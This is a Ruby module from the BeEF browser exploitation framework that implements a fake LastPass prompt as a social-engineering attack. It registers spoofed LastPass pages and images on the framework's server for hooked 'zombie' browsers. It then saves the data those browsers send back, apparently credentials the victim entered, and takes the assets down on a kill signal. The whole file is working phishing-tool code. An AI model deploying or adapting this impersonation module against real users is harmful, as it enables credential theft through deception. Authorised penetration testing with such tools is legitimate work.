#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_lastpass < BeEF::Core::Command
  
  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/index.html','/lp/index','html')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/indexFF.html','/lp/indexFF','html')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/key_small.png','/lp/key_small','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/lpwhite_small.png','/lp/lpwhite_small','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/q3Jrp.png','/lp/q3Jrp','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/screenkeyboard.png','/lp/screenkeyboard','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/xsmall.png','/lp/xsmall','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/create_small.png','/lp/create_small','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/icon.png','/lp/icon','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_lastpass/jquery-1.5.2.min.js','/lp/jquery','js')
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    if (@datastore['meta'] == "KILLFRAME") 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/index.html')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/indexFF.html')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/key_small.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/lpwhite_small.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/q3Jrp.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/screenkeyboard.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/xsmall.png') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/create_small.png') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/icon.png') 
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/lp/jquery.js') 
    end
    content = {}
    content['result'] = @datastore['result']
    save content
  end
  
end
